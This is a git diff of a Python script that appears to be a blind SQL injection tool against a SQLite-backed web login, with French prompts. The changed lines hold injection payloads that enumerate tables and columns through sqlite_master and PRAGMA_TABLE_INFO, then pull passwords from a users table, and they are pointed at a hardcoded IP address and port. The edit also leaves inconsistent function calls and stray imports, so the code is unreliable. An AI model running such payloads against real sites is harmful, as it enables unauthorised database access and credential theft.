@@ -1,12 +1,13 @@
 #/usr/bin/python3
 
-from pip._vendor import requests
+from audioop import add
 from logging import exception
 import requests;
 import socket;
 import sys;
+import pip._vendor.requests;
 
-address = input("Enter l'adresse du site: ")
+ # address = input("Enter l'adresse du site: ")
 #port = input ("Entrer le port du site : ")
 
 def main():
@@ -24,7 +25,7 @@ def main():
         scan()
 
     if n == '2':
-        search()
+        search("FROM PRAGMA_TABLE_INFO('" + search("FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'", "http://37.187.125.224:8091", " limit 1) -- -") + "')", "http://37.187.125.224:8091", " limit 1, 2) -- -")
 
 ##----------------------------------------------------------------------------------------
 
@@ -96,12 +97,11 @@ def search(endPayload, URL, limit) :
                 index = 0
                 return result
         
-    # search("name", "FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'", "http://37.187.125.224:8091", " limit 1) -- -")
-    # search("name", "FROM PRAGMA_TABLE_INFO('users')", "http://37.187.125.224:8091", " limit 1, 2) -- -")
-    search("name", "FROM PRAGMA_TABLE_INFO('" + search("name", "FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'",address, " limit 1) -- -") + "')", address, " limit 1, 2) -- -")
-    search("password", "FROM users", address, " limit 1)-- -")
 
-    # admin' and (SELECT substr(password, 1, 1) = "_" FROM users limit 1) -- -
+
+# search("FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'", "http://37.187.125.224:8091")
+# search("FROM PRAGMA_TABLE_INFO('users')", "http://37.187.125.224:8091")
+     # search()
 
 
 main()
